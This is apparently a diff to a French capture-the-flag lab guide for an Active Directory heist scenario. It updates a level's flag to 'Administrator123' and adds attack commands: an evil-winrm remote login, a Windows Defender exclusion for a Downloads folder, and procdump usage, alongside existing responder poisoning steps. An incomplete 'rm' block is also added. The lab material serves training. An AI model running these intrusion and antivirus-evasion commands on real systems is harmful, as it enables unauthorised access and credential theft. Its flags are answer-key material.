@@ -188,7 +188,7 @@ Level 4 (AD Bellagio) : Attaque via le lien de confiance et empoisonnement SMB/L
 
 Script pour histoire du niveau :
 
-send_request "Hash bruteforce" 4 "Grâce au compte trouvé, tu peux donc effectuer une recherche pour connaitre le ou les différents lien de confiance qui sont liés a ce serveur.<br><br>Avec toutes ces informations tu peux ensuite t'interesser au partage de fichier. Votre équipe a besoin de vous car elle est bloqué sans ce mot de passe ils ne pourront pas passer les portiques de sécurité qui va permettre a l'équipe de pouvoir se déplacer librement entre le Bellagio et le MGM Grand <br><br>Entre le mot de passe bruteforcé." "Qwerty123" 300
+send_request "Hash bruteforce" 4 "Grâce au compte trouvé, tu peux donc effectuer une recherche pour connaitre le ou les différents lien de confiance qui sont liés a ce serveur.<br><br>Avec toutes ces informations tu peux ensuite t'interesser au partage de fichier. Votre équipe a besoin de vous car elle est bloqué sans ce mot de passe ils ne pourront pas passer les portiques de sécurité qui va permettre a l'équipe de pouvoir se déplacer librement entre le Bellagio et le MGM Grand <br><br>Entre le mot de passe bruteforcé." "Administrator123" 300
 
 
 Attaque : 
@@ -224,7 +224,7 @@ responder -I wg0
 ```
 
 
-Flag : Qwerty123
+Flag : Administrator123
 
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -242,6 +242,15 @@ Attaque :
 L'utilisateur se doit de créer un compte admin local grace a son droit de changer le fichier de script dans les taches planifiés
 
 Exemple de script : 
+
+```shell
+    evil-winrm -i IP_X.X.X.X -u "$USER" -p "$PASSWOR"
+```
+
+```shell
+    rm 
+```
+
 
 ```powershell
 $username = "NomUtilisateur"
@@ -299,6 +308,11 @@ ensuite l'extraire
 ```
 
 puis l'installer en tant que debogger par défaut pour qu'il se lance sans problème même à travers une connexion distante et accepter les conditions d'utilisation.
+
+
+```Powershell
+    Add-MpPreference -ExclusionPath "C:/Users/lala/Downloads/"
+```
 
 ```Powershell
     .\procdump.exe -accepteula -i
